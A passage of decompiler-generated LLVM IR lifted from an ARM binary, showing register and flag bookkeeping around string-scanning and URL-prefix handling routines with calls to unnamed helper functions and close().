  store i1 %v6_a718, i1* %cpsr_n.global-to-local, align 1
  %v7_a718 = icmp eq i8 %v4_a72c, 47
  store i1 %v7_a718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a718, label %dec_label_pc_a8a0, label %dec_label_pc_a720

dec_label_pc_a720:                                ; preds = %dec_label_pc_a718, %dec_label_pc_a710
  %v0_a734 = phi i32 [ %v1_a734, %dec_label_pc_a718 ], [ 1, %dec_label_pc_a710 ]
  store i32 %v0_a734, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  %v2_a72c = add i32 %v0_a734, %v1_a708
  %v3_a72c = inttoptr i32 %v2_a72c to i8*
  %v4_a72c = load i8, i8* %v3_a72c, align 1
  %v6_a72c = zext i8 %v4_a72c to i32
  store i32 %v6_a72c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_a730 = icmp eq i8 %v4_a72c, 0
  store i1 %v2_a730, i1* %cpsr_z.global-to-local, align 1
  %v1_a734 = add i32 %v0_a734, 1
  store i32 %v1_a734, i32* %r3.global-to-local, align 4
  store i32 %v2_a72c, i32* %r1.global-to-local, align 4
  br i1 %v2_a730, label %dec_label_pc_a740, label %dec_label_pc_a718

dec_label_pc_a740:                                ; preds = %dec_label_pc_a720, %bb234, %dec_label_pc_a8a0
  %stack_var_-40.23 = phi i32 [ %v0_a6f0, %bb234 ], [ %stack_var_-40.24, %dec_label_pc_a8a0 ], [ %v0_a734, %dec_label_pc_a720 ]
  %v0_a740 = load i32, i32* @r5, align 4
  store i32 %v0_a740, i32* %r0.global-to-local, align 4
  %v1_a744 = inttoptr i32 %v0_a740 to i8*
  %v2_a744 = call i32 @function_13a08(i8* %v1_a744)
  store i32 %v2_a744, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a748 = icmp slt i32 %v2_a744, 0
  store i1 %v1_a748, i1* %cpsr_n.global-to-local, align 1
  %v2_a748 = icmp eq i32 %v2_a744, 0
  store i1 %v2_a748, i1* %cpsr_z.global-to-local, align 1
  %tmp236 = icmp slt i32 %v2_a744, 1
  br i1 %tmp236, label %dec_label_pc_a76c, label %dec_label_pc_a750

dec_label_pc_a750:                                ; preds = %dec_label_pc_a740
  %v0_a750 = load i32, i32* @r5, align 4
  store i32 %v0_a750, i32* %r0.global-to-local, align 4
  %v1_a754 = inttoptr i32 %v0_a750 to i8*
  %v2_a754 = call i32 @function_13a08(i8* %v1_a754)
  store i32 %v2_a754, i32* %r0.global-to-local, align 4
  %v1_a758 = add i32 %v2_a754, -127
  %v2_a758 = icmp ugt i32 %v2_a754, 126
  store i1 %v2_a758, i1* %cpsr_c.global-to-local, align 1
  %v3_a758 = sub i32 126, %v2_a754
  %v4_a758 = and i32 %v3_a758, %v2_a754
  %v5_a758 = icmp slt i32 %v4_a758, 0
  store i1 %v5_a758, i1* %cpsr_v.global-to-local, align 1
  %v6_a758 = icmp slt i32 %v1_a758, 0
  store i1 %v6_a758, i1* %cpsr_n.global-to-local, align 1
  %v7_a758 = icmp eq i32 %v2_a754, 127
  store i1 %v7_a758, i1* %cpsr_z.global-to-local, align 1
  %v7_a75c = icmp sgt i32 %v2_a754, 127
  br i1 %v7_a75c, label %.thread59, label %bb237

bb237:                                            ; preds = %dec_label_pc_a750
  %v8_a75c = load i32, i32* %sb.global-to-local, align 4
  %v9_a760 = add i32 %v8_a75c, 789
  store i32 %v9_a760, i32* %r0.global-to-local, align 4
  %v8_a764 = load i32, i32* @r5, align 4
  store i32 %v8_a764, i32* %r1.global-to-local, align 4
  br label %.thread59

.thread59:                                        ; preds = %dec_label_pc_a750, %bb237
  store i32 42860, i32* %lr.global-to-local, align 4
  %v3_a768 = xor i1 %v6_a758, %v5_a758
  %v4_a768 = or i1 %v7_a758, %v3_a768
  call void @__pseudo_cond_branch(i1 %v4_a768, i32 ptrtoint (i32* @global_var_13a30.104 to i32))
  br label %dec_label_pc_a76c

dec_label_pc_a76c:                                ; preds = %dec_label_pc_a740, %.thread59
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v0_a774 = load i32, i32* @r5, align 4
  %v2_a774 = add i32 %stack_var_-40.23, 1
  %v1_a778 = add i32 %v0_a774, %v2_a774
  store i32 %v1_a778, i32* %r0.global-to-local, align 4
  %v1_a77c = inttoptr i32 %v1_a778 to i8*
  %v2_a77c = call i32 @function_13a08(i8* %v1_a77c)
  store i32 %v2_a77c, i32* %r0.global-to-local, align 4
  %v1_a780 = add i32 %v2_a77c, -255
  %v2_a780 = icmp ugt i32 %v2_a77c, 254
  store i1 %v2_a780, i1* %cpsr_c.global-to-local, align 1
  %v3_a780 = sub i32 254, %v2_a77c
  %v4_a780 = and i32 %v3_a780, %v2_a77c
  %v5_a780 = icmp slt i32 %v4_a780, 0
  store i1 %v5_a780, i1* %cpsr_v.global-to-local, align 1
  %v6_a780 = icmp slt i32 %v1_a780, 0
  store i1 %v6_a780, i1* %cpsr_n.global-to-local, align 1
  %v7_a780 = icmp eq i32 %v2_a77c, 255
  store i1 %v7_a780, i1* %cpsr_z.global-to-local, align 1
  %v8_a784 = icmp sgt i32 %v2_a77c, 255
  br i1 %v8_a784, label %dec_label_pc_a158, label %dec_label_pc_a788

dec_label_pc_a788:                                ; preds = %dec_label_pc_a76c
  %v0_a788 = load i32, i32* %sb.global-to-local, align 4
  %v1_a78c = add i32 %v0_a788, 533
  store i32 %v1_a78c, i32* @r4, align 4
  store i32 %v1_a78c, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_a798 = call i32 @function_13aa8(i32 %v1_a78c, i32 255)
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  %v0_a7a4 = load i32, i32* @r5, align 4
  %v1_a7a8 = add i32 %v0_a7a4, %v2_a774
  store i32 %v1_a7a8, i32* %r0.global-to-local, align 4
  %v1_a7ac = inttoptr i32 %v1_a7a8 to i8*
  %v2_a7ac = call i32 @function_13a08(i8* %v1_a7ac)
  store i32 %v2_a7ac, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a7b0 = icmp slt i32 %v2_a7ac, 0
  store i1 %v1_a7b0, i1* %cpsr_n.global-to-local, align 1
  %v2_a7b0 = icmp eq i32 %v2_a7ac, 0
  store i1 %v2_a7b0, i1* %cpsr_z.global-to-local, align 1
  %tmp238 = icmp slt i32 %v2_a7ac, 1
  br i1 %tmp238, label %dec_label_pc_a158, label %dec_label_pc_a7b8

dec_label_pc_a7b8:                                ; preds = %dec_label_pc_a788
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  %v0_a7c0 = load i32, i32* @r5, align 4
  %v0_a7c4 = load i32, i32* @r4, align 4
  store i32 %v0_a7c4, i32* @r0, align 4
  %v1_a7c8 = add i32 %v2_a774, %v0_a7c0
  store i32 %v1_a7c8, i32* %r1.global-to-local, align 4
  %v2_a7cc = inttoptr i32 %v0_a7c4 to i8*
  %v3_a7cc = call i32 @function_13a30(i8* %v2_a7cc, i32 %v1_a7c8)
  store i32 %v3_a7cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a158

dec_label_pc_a7d4:                                ; preds = %dec_label_pc_9b28
  %v0_a7d4 = load i32, i32* @r8, align 4
  %v1_a7d4 = add i32 %v0_a7d4, -1456
  %v2_a7d4 = inttoptr i32 %v1_a7d4 to i32*
  %v3_a7d4 = load i32, i32* %v2_a7d4, align 4
  store i32 %v3_a7d4, i32* %r0.global-to-local, align 4
  %v1_a7d8 = call i32 @close(i32 %v3_a7d4)
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_a7e4 = load i32, i32* @r8, align 4
  %v2_a7e4 = add i32 %v1_a7e4, -1456
  %v3_a7e4 = inttoptr i32 %v2_a7e4 to i32*
  store i32 -1, i32* %v3_a7e4, align 4
  %v0_a7e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_a7e8 = trunc i32 %v0_a7e8 to i8
  %v2_a7e8 = load i32, i32* @r8, align 4
  %v3_a7e8 = add i32 %v2_a7e8, -1452
  %v4_a7e8 = inttoptr i32 %v3_a7e8 to i8*
  store i8 %v1_a7e8, i8* %v4_a7e8, align 1
  br label %dec_label_pc_9590

dec_label_pc_a7f0:                                ; preds = %dec_label_pc_a3a8
  %v0_a7f0 = load i32, i32* @r8, align 4
  %v1_a7f0 = add i32 %v0_a7f0, -1452
  %v2_a7f0 = inttoptr i32 %v1_a7f0 to i8*
  %v3_a7f0 = load i8, i8* %v2_a7f0, align 1
  %v4_a7f0 = zext i8 %v3_a7f0 to i32
  store i32 %v4_a7f0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_a7f4 = icmp eq i8 %v3_a7f0, 0
  store i1 %v2_a7f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a7f4, label %dec_label_pc_9590, label %dec_label_pc_a158

dec_label_pc_a800:                                ; preds = %dec_label_pc_a618
  %v0_a800 = load i32, i32* @r4, align 4
  store i32 %v0_a800, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_14368.76 to i32), i32* %r1.global-to-local, align 4
  %v3_a808 = inttoptr i32 %v0_a800 to i8*
  %v4_a808 = call i32 @function_13de8(i8* %v3_a808, i32 ptrtoint ([4 x i8]* @global_var_14368.76 to i32))
  store i32 %v4_a808, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a80c = icmp slt i32 %v4_a808, 0
  store i1 %v1_a80c, i1* %cpsr_n.global-to-local, align 1
  %v2_a80c = icmp eq i32 %v4_a808, 0
  store i1 %v2_a80c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a80c, label %bb239, label %dec_label_pc_a64c

bb239:                                            ; preds = %dec_label_pc_a800
  %v0_a814 = load i32, i32* %fp.global-to-local, align 4
  %v1_a814 = load i32, i32* @r5, align 4
  %v2_a814 = sub i32 %v0_a814, %v1_a814
  %v3_a814 = icmp uge i32 %v0_a814, %v1_a814
  store i1 %v3_a814, i1* %cpsr_c.global-to-local, align 1
  %v4_a814 = xor i32 %v1_a814, %v0_a814
  %v5_a814 = xor i32 %v2_a814, %v0_a814
  %v6_a814 = and i32 %v5_a814, %v4_a814
  %v7_a814 = icmp slt i32 %v6_a814, 0
  store i1 %v7_a814, i1* %cpsr_v.global-to-local, align 1
  %v8_a814 = icmp slt i32 %v2_a814, 0
  store i1 %v8_a814, i1* %cpsr_n.global-to-local, align 1
  %v9_a814 = icmp eq i32 %v0_a814, %v1_a814
  store i1 %v9_a814, i1* %cpsr_z.global-to-local, align 1
  %v7_a818 = icmp sgt i32 %v0_a814, %v1_a814
  %. = select i1 %v7_a818, i32 10, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v9_a820 = trunc i32 %. to i8
  %v10_a820 = load i32, i32* @r8, align 4
  %v11_a820 = add i32 %v10_a820, -1452
  %v12_a820 = inttoptr i32 %v11_a820 to i8*
  store i8 %v9_a820, i8* %v12_a820, align 1
  br label %dec_label_pc_a654

dec_label_pc_a82c:                                ; preds = %dec_label_pc_a2a0
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 36, i32* %r0.global-to-local, align 4
  %v0_a834 = load i32, i32* @r8, align 4
  %v1_a834 = add i32 %v0_a834, 656
  %v2_a834 = inttoptr i32 %v1_a834 to i32*
  %v3_a834 = load i32, i32* %v2_a834, align 4
  store i32 %v3_a834, i32* @r4, align 4
  %v3_a838 = call i32 @function_13000(i32 36, i32* null)
  %v0_a83c = load i32, i32* @r4, align 4
  store i32 %v0_a83c, i32* %r1.global-to-local, align 4
  store i32 %v3_a838, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_a848 = load i32, i32* @r7, align 4
  store i32 %v0_a848, i32* %r0.global-to-local, align 4
  %v4_a84c = call i32 @function_13acc(i32 %v0_a848, i32 %v0_a83c, i32 %v3_a838, i32 11)
  store i32 %v4_a84c, i32* %r0.global-to-local, align 4
  %v0_a850 = load i32, i32* @r8, align 4
  %v1_a850 = add i32 %v0_a850, 656
  %v2_a850 = inttoptr i32 %v1_a850 to i32*
  %v3_a850 = load i32, i32* %v2_a850, align 4
  %v0_a854 = load i32, i32* @r7, align 4
  %v2_a854 = add i32 %v0_a854, %v4_a84c
  store i32 %v2_a854, i32* @r5, align 4
  store i32 %v4_a84c, i32* @r4, align 4
  %v2_a85c = sub i32 %v3_a850, %v4_a84c
  store i32 %v2_a85c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_143a4.106 to i32), i32* %r2.global-to-local, align 4
  %v0_a864 = load i32, i32* @sl, align 4
  store i32 %v0_a864, i32* %r3.global-to-local, align 4
  store i32 %v2_a854, i32* %r0.global-to-local, align 4
  %v4_a86c = call i32 @function_13acc(i32 %v2_a854, i32 %v2_a85c, i32 ptrtoint (i32* @global_var_143a4.106 to i32), i32 %v0_a864)
  store i32 %v4_a86c, i32* %r0.global-to-local, align 4
  %v0_a870 = load i32, i32* @r8, align 4
  %v1_a870 = add i32 %v0_a870, 12
  %v2_a870 = inttoptr i32 %v1_a870 to i32*
  %v3_a870 = load i32, i32* %v2_a870, align 4
  store i32 %v3_a870, i32* %r3.global-to-local, align 4
  %v0_a874 = load i32, i32* @r4, align 4
  %v2_a874 = add i32 %v0_a874, %v4_a86c
  store i32 %v2_a874, i32* %r6.global-to-local, align 4
  %v1_a878 = load i32, i32* %sb.global-to-local, align 4
  %v2_a878 = add i32 %v1_a878, %v2_a874
  store i32 %v2_a878, i32* %r2.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v1_a880 = add i32 %v3_a870, -4
  %v2_a880 = icmp ugt i32 %v3_a870, 3
  store i1 %v2_a880, i1* %cpsr_c.global-to-local, align 1
  %v3_a880 = sub i32 3, %v3_a870
  %v4_a880 = and i32 %v3_a880, %v3_a870
  %v5_a880 = icmp slt i32 %v4_a880, 0
  store i1 %v5_a880, i1* %cpsr_v.global-to-local, align 1
  %v6_a880 = icmp slt i32 %v1_a880, 0
  store i1 %v6_a880, i1* %cpsr_n.global-to-local, align 1
  %v7_a880 = icmp eq i32 %v3_a870, 4
  store i1 %v7_a880, i1* %cpsr_z.global-to-local, align 1
  %v3_a884 = add i32 %v2_a878, 2115
  %v4_a884 = inttoptr i32 %v3_a884 to i8*
  store i8 0, i8* %v4_a884, align 1
  %v7_a888 = icmp sgt i32 %v3_a870, 4
  br i1 %v7_a888, label %dec_label_pc_a88c, label %dec_label_pc_a914

dec_label_pc_a88c:                                ; preds = %dec_label_pc_a82c, %dec_label_pc_a914, %dec_label_pc_a924
  store i32 -1, i32* %r6.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_a894 = load i32, i32* @r8, align 4
  %v2_a894 = add i32 %v1_a894, 8
  %v3_a894 = inttoptr i32 %v2_a894 to i32*
  store i32 -1, i32* %v3_a894, align 4
  %v0_a898 = load i32, i32* %r3.global-to-local, align 4
  %v1_a898 = trunc i32 %v0_a898 to i8
  %v2_a898 = load i32, i32* @r8, align 4
  %v3_a898 = add i32 %v2_a898, -1452
  %v4_a898 = inttoptr i32 %v3_a898 to i8*
  store i8 %v1_a898, i8* %v4_a898, align 1
  br label %dec_label_pc_9590

dec_label_pc_a8a0:                                ; preds = %dec_label_pc_a718, %bb235
  %v2_a8a4 = phi i32 [ %v1_a708, %bb235 ], [ %v2_a72c, %dec_label_pc_a718 ]
  %stack_var_-40.24 = phi i32 [ %v0_a6f0, %bb235 ], [ %v0_a734, %dec_label_pc_a718 ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_a8a4 = inttoptr i32 %v2_a8a4 to i8*
  store i8 0, i8* %v3_a8a4, align 1
  br label %dec_label_pc_a740

dec_label_pc_a8ac:                                ; preds = %dec_label_pc_a148
  %v0_a8ac = load i32, i32* %sb.global-to-local, align 4
  %v1_a8b0 = add i32 %v0_a8ac, 533
  store i32 %v1_a8b0, i32* @r4, align 4
  store i32 %v1_a8b0, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_a8bc = call i32 @function_13aa8(i32 %v1_a8b0, i32 255)
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  %v0_a8c8 = load i32, i32* @r5, align 4
  %v2_a8c8 = add i32 %stack_var_-40.11, 1
  %v1_a8cc = add i32 %v0_a8c8, %v2_a8c8
  store i32 %v1_a8cc, i32* %r0.global-to-local, align 4
  %v1_a8d0 = inttoptr i32 %v1_a8cc to i8*
  %v2_a8d0 = call i32 @function_13a08(i8* %v1_a8d0)
  store i32 %v2_a8d0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a8d4 = icmp slt i32 %v2_a8d0, 0
  store i1 %v1_a8d4, i1* %cpsr_n.global-to-local, align 1
  %v2_a8d4 = icmp eq i32 %v2_a8d0, 0
  store i1 %v2_a8d4, i1* %cpsr_z.global-to-local, align 1
  %tmp240 = icmp slt i32 %v2_a8d0, 1
  br i1 %tmp240, label %dec_label_pc_a158, label %dec_label_pc_a8dc

dec_label_pc_a8dc:                                ; preds = %dec_label_pc_a8ac
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v0_a8e4 = load i32, i32* @r5, align 4
  %v1_a8e8 = add i32 %v0_a8e4, %v2_a8c8
  store i32 %v1_a8e8, i32* %r0.global-to-local, align 4
  %v1_a8ec = inttoptr i32 %v1_a8e8 to i8*
  %v2_a8ec = call i32 @function_13a08(i8* %v1_a8ec)
  store i32 %v2_a8ec, i32* %r0.global-to-local, align 4
  %v1_a8f0 = add i32 %v2_a8ec, -255
  %v2_a8f0 = icmp ugt i32 %v2_a8ec, 254
  store i1 %v2_a8f0, i1* %cpsr_c.global-to-local, align 1
  %v3_a8f0 = sub i32 254, %v2_a8ec
  %v4_a8f0 = and i32 %v3_a8f0, %v2_a8ec
  %v5_a8f0 = icmp slt i32 %v4_a8f0, 0
  store i1 %v5_a8f0, i1* %cpsr_v.global-to-local, align 1
  %v6_a8f0 = icmp slt i32 %v1_a8f0, 0
  store i1 %v6_a8f0, i1* %cpsr_n.global-to-local, align 1
  %v7_a8f0 = icmp eq i32 %v2_a8ec, 255
  store i1 %v7_a8f0, i1* %cpsr_z.global-to-local, align 1
  %v8_a8f4 = icmp sgt i32 %v2_a8ec, 255
  br i1 %v8_a8f4, label %dec_label_pc_a158, label %dec_label_pc_a8f8

dec_label_pc_a8f8:                                ; preds = %dec_label_pc_a8dc
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  %v0_a900 = load i32, i32* @r5, align 4
  %v0_a904 = load i32, i32* @r4, align 4
  store i32 %v0_a904, i32* @r0, align 4
  %v1_a908 = add i32 %v2_a8c8, %v0_a900
  store i32 %v1_a908, i32* %r1.global-to-local, align 4
  %v2_a90c = inttoptr i32 %v0_a904 to i8*
  %v3_a90c = call i32 @function_13a30(i8* %v2_a90c, i32 %v1_a908)
  store i32 %v3_a90c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a158

dec_label_pc_a914:                                ; preds = %dec_label_pc_a82c
  %v0_a914 = load i32, i32* @r5, align 4
  store i32 %v0_a914, i32* %r0.global-to-local, align 4
  %v1_a918 = inttoptr i32 %v0_a914 to i8*
  %v2_a918 = call i32 @function_13a08(i8* %v1_a918)
  store i32 %v2_a918, i32* %r0.global-to-local, align 4
  %v1_a91c = add i32 %v2_a918, -127
  %v2_a91c = icmp ugt i32 %v2_a918, 126
  store i1 %v2_a91c, i1* %cpsr_c.global-to-local, align 1
  %v3_a91c = sub i32 126, %v2_a918
  %v4_a91c = and i32 %v3_a91c, %v2_a918
  %v5_a91c = icmp slt i32 %v4_a91c, 0
  store i1 %v5_a91c, i1* %cpsr_v.global-to-local, align 1
  %v6_a91c = icmp slt i32 %v1_a91c, 0
  store i1 %v6_a91c, i1* %cpsr_n.global-to-local, align 1
  %v7_a91c = icmp eq i32 %v2_a918, 127
  store i1 %v7_a91c, i1* %cpsr_z.global-to-local, align 1
  %v8_a920 = icmp sgt i32 %v2_a918, 127
  br i1 %v8_a920, label %dec_label_pc_a88c, label %dec_label_pc_a924

dec_label_pc_a924:                                ; preds = %dec_label_pc_a914
  %v0_a924 = load i32, i32* @r8, align 4
  %v1_a924 = add i32 %v0_a924, 12
  %v2_a924 = inttoptr i32 %v1_a924 to i32*
  %v3_a924 = load i32, i32* %v2_a924, align 4
  store i32 %v1_a168, i32* %r2.global-to-local, align 4
  %v1_a92c = and i32 %v3_a924, 33554432
  %v2_a92c = icmp ne i32 %v1_a92c, 0
  store i1 %v2_a92c, i1* %cpsr_c.global-to-local, align 1
  %v3_a92c = mul i32 %v3_a924, 128
  %v0_a930 = load i32, i32* @r5, align 4
  store i32 %v0_a930, i32* %r1.global-to-local, align 4
  %v2_a934 = add i32 %v3_a92c, %v1_a168
  store i32 %v2_a934, i32* @r0, align 4
  %v2_a938 = inttoptr i32 %v2_a934 to i8*
  %v3_a938 = call i32 @function_13a30(i8* %v2_a938, i32 %v0_a930)
  store i32 %v3_a938, i32* %r0.global-to-local, align 4
  %v0_a93c = load i32, i32* @r8, align 4
  %v1_a93c = add i32 %v0_a93c, 12
  %v2_a93c = inttoptr i32 %v1_a93c to i32*
  %v3_a93c = load i32, i32* %v2_a93c, align 4
  store i32 %v1_a168, i32* %r3.global-to-local, align 4
  %v1_a944 = and i32 %v3_a93c, 33554432
  %v2_a944 = icmp ne i32 %v1_a944, 0
  store i1 %v2_a944, i1* %cpsr_c.global-to-local, align 1
  %v3_a944 = mul i32 %v3_a93c, 128
  %v2_a948 = add i32 %v3_a944, %v1_a168
  store i32 %v2_a948, i32* %r4.global-to-local, align 4
  store i32 %v2_a948, i32* %r0.global-to-local, align 4
  %v1_a950 = inttoptr i32 %v2_a948 to i8*
  %v2_a950 = call i32 @function_13a08(i8* %v1_a950)
  store i32 ptrtoint (i32* @global_var_143a8.108 to i32), i32* %r1.global-to-local, align 4
  %v2_a958 = add i32 %v2_a948, %v2_a950
  store i32 %v2_a958, i32* @r0, align 4
  %v2_a95c = inttoptr i32 %v2_a958 to i8*
  %v3_a95c = call i32 @function_13a30(i8* %v2_a95c, i32 ptrtoint (i32* @global_var_143a8.108 to i32))
  store i32 %v3_a95c, i32* %r0.global-to-local, align 4
  %v0_a960 = load i32, i32* %r6.global-to-local, align 4
  %v1_a960 = add i32 %v0_a960, 3
  store i32 %v1_a960, i32* @r4, align 4
  %v0_a964 = load i32, i32* @r8, align 4
  %v1_a964 = add i32 %v0_a964, 656
  %v2_a964 = inttoptr i32 %v1_a964 to i32*
  %v3_a964 = load i32, i32* %v2_a964, align 4
  %v0_a968 = load i32, i32* @r7, align 4
  %v2_a968 = add i32 %v0_a968, %v1_a960
  store i32 %v2_a968, i32* %r6.global-to-local, align 4
  %v2_a96c = sub i32 %v3_a964, %v1_a960
  store i32 %v2_a96c, i32* %r1.global-to-local, align 4
  %v0_a970 = load i32, i32* @sl, align 4
  store i32 %v0_a970, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_143a4.106 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a968, i32* %r0.global-to-local, align 4
  %v4_a97c = call i32 @function_13acc(i32 %v2_a968, i32 %v2_a96c, i32 ptrtoint (i32* @global_var_143a4.106 to i32), i32 %v0_a970)
  store i32 %v4_a97c, i32* %r0.global-to-local, align 4
  %v0_a980 = load i32, i32* @r8, align 4
  %v1_a980 = add i32 %v0_a980, 12
  %v2_a980 = inttoptr i32 %v1_a980 to i32*
  %v3_a980 = load i32, i32* %v2_a980, align 4
  store i32 %v1_a168, i32* %ip.global-to-local, align 4
  %v1_a988 = and i32 %v3_a980, 33554432
  %v2_a988 = icmp ne i32 %v1_a988, 0
  store i1 %v2_a988, i1* %cpsr_c.global-to-local, align 1
  %v3_a988 = mul i32 %v3_a980, 128
  %v0_a98c = load i32, i32* @r4, align 4
  %v1_a98c = load i32, i32* %sb.global-to-local, align 4
  %v2_a990 = add i32 %v3_a988, %v1_a168
  store i32 %v2_a990, i32* @r5, align 4
  %v2_a98c = add i32 %v0_a98c, %v4_a97c
  %v2_a994 = add i32 %v2_a98c, %v1_a98c
  store i32 %v2_a994, i32* @r4, align 4
  %v0_a998 = load i32, i32* %fp.global-to-local, align 4
  %v1_a998 = trunc i32 %v0_a998 to i8
  %v3_a998 = add i32 %v2_a994, 2115
  %v4_a998 = inttoptr i32 %v3_a998 to i8*
  store i8 %v1_a998, i8* %v4_a998, align 1
  %v0_a99c = load i32, i32* @r5, align 4
  store i32 %v0_a99c, i32* %r0.global-to-local, align 4
  %v1_a9a0 = inttoptr i32 %v0_a99c to i8*
  %v2_a9a0 = call i32 @function_13a08(i8* %v1_a9a0)
  %v0_a9a4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_a9a4, i32* %r1.global-to-local, align 4
  %v0_a9a8 = load i32, i32* @r5, align 4
  %v2_a9a8 = add i32 %v0_a9a8, %v2_a9a0
  store i32 %v2_a9a8, i32* @r0, align 4
  %v2_a9ac = inttoptr i32 %v2_a9a8 to i8*
  %v3_a9ac = call i32 @function_13a30(i8* %v2_a9ac, i32 %v0_a9a4)
  store i32 %v3_a9ac, i32* %r0.global-to-local, align 4
  %v0_a9b0 = load i32, i32* @r8, align 4
  %v1_a9b0 = add i32 %v0_a9b0, 12
  %v2_a9b0 = inttoptr i32 %v1_a9b0 to i32*
  %v3_a9b0 = load i32, i32* %v2_a9b0, align 4
  %v1_a9b4 = add i32 %v3_a9b0, 1
  store i32 %v1_a9b4, i32* %r3.global-to-local, align 4
  store i32 %v1_a9b4, i32* %v2_a9b0, align 4
  br label %dec_label_pc_a88c

dec_label_pc_a9c0:                                ; preds = %dec_label_pc_a5a4
  store i32 7, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v0_a9cc = load i32, i32* @r5, align 4
  %v1_a9cc = add i32 %v0_a9cc, 4
  %v2_a9cc = inttoptr i32 %v1_a9cc to i8*
  %v3_a9cc = load i8, i8* %v2_a9cc, align 1
  %v4_a9cc = zext i8 %v3_a9cc to i32
  store i32 %v4_a9cc, i32* %r3.global-to-local, align 4
  %v2_a9d0 = icmp ugt i8 %v3_a9cc, 114
  store i1 %v2_a9d0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a9d0 = icmp ult i8 %v3_a9cc, 115
  store i1 %v6_a9d0, i1* %cpsr_n.global-to-local, align 1
  %v7_a9d0 = icmp eq i8 %v3_a9cc, 115
  store i1 %v7_a9d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a9d0, label %bb241, label %bb242

bb241:                                            ; preds = %dec_label_pc_a9c0
  store i32 8, i32* %ip.global-to-local, align 4
  br label %bb242

bb242:                                            ; preds = %dec_label_pc_a9c0, %bb241
  %v1_a9d8 = phi i32 [ 7, %dec_label_pc_a9c0 ], [ 8, %bb241 ]
  %v1_a9d8. = select i1 %v7_a9d0, i32 %v1_a9d8, i32 7
  %v0_a9e4 = load i32, i32* @r7, align 4
  %v1_a9e4 = sub nsw i32 1, %v1_a9d8.
  %v2_a9e8 = add i32 %v1_a9e4, %v0_a9e4
  store i32 %v2_a9e8, i32* %r2.global-to-local, align 4
  store i32 %v0_a9cc, i32* %r0.global-to-local, align 4
  %v2_a9f0 = add i32 %v1_a9d8., %v0_a9cc
  store i32 %v2_a9f0, i32* %r1.global-to-local, align 4
  %v3_a9f4 = call i32 @_memmove(i32 %v0_a9cc, i32 %v2_a9f0, i32 %v2_a9e8)
  store i32 %v3_a9f4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  %v0_aa04 = load i32, i32* @r6, align 4
  %v1_aa04 = load i32, i32* @r4, align 4
  %v2_aa04 = add i32 %v1_aa04, %v0_aa04
  %v3_aa04 = inttoptr i32 %v2_aa04 to i8*
  %v4_aa04 = load i8, i8* %v3_aa04, align 1
  %v6_aa04 = zext i8 %v4_aa04 to i32
  store i32 %v6_aa04, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v9_aa08 = icmp eq i8 %v4_aa04, 0
  store i1 %v9_aa08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aa08, label %dec_label_pc_aa48, label %dec_label_pc_aa10

dec_label_pc_aa10:                                ; preds = %bb242
  %v2_aa10 = icmp ugt i8 %v4_aa04, 46
  store i1 %v2_aa10, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_aa10 = icmp ult i8 %v4_aa04, 47
  store i1 %v6_aa10, i1* %cpsr_n.global-to-local, align 1
  %v7_aa10 = icmp eq i8 %v4_aa04, 47
  store i1 %v7_aa10, i1* %cpsr_z.global-to-local, align 1
  %v1_aa14 = load i32, i32* @r5, align 4
